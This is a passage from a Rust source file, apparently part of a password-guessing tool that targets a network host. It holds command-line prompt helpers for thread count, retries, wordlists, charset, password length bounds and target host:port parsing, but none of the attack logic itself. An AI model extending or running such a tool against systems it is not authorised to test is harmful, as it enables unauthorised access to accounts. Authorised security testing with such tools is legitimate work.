        }
    }
}

fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Number of threads (default {}): ", default));
        if input.is_empty() {
            return default.max(1);
        }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= 256 => return val,
            _ => println!("[!] Invalid thread count (1-256)."),
        }
    }
}

fn prompt_retries(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Max retries per attempt (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val <= 10 => return val,
            _ => println!("[!] Invalid retry count (max 10)."),
        }
    }
}

fn prompt_yes_no(message: &str, default: bool) -> bool {
    loop {
        let input = prompt(message);
        if input.is_empty() {
            return default;
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" => return true,
            "n" | "no" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!("[!] File '{}' does not exist or is not a file.", trimmed);
        }
    }
}

fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            return Ok(None);
        }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() {
            return Ok(Some(trimmed.to_string()));
        } else {
            println!("[!] File '{}' does not exist or is not a file.", trimmed);
        }
    }
}

fn prompt_charset(prompt_text: &str, default: &str) -> String {
    let input = prompt(prompt_text);
    if input.is_empty() {
        default.to_string()
    } else {
        input.trim().to_string()
    }
}

fn prompt_min_length(default: usize, min: usize, max: usize) -> usize {
    loop {
        let input = prompt(&format!("Minimum password length ({}-{}, default {}): ", min, max, default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val >= min && val <= max => return val,
            _ => println!("[!] Invalid length ({}-{}).", min, max),
        }
    }
}

fn prompt_max_length(default: usize, min: usize, max: usize) -> usize {
    loop {
        let input = prompt(&format!("Maximum password length ({}-{}, default {}): ", min, max, default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val >= min && val <= max => return val,
            _ => println!("[!] Invalid length ({}-{}).", min, max),
        }
    }
}

fn prompt_list(prompt_text: &str) -> Vec<String> {
    let input = prompt(prompt_text);
    input
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let caps = re
        .captures(host.trim())
        .ok_or_else(|| anyhow::anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str().parse::<u16>().context("Invalid port value")?
    } else {
        default_port
    };
    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };
    formatted
        .to_socket_addrs()
        .context(format!("Could not resolve {}", formatted))?;
    Ok(formatted)
}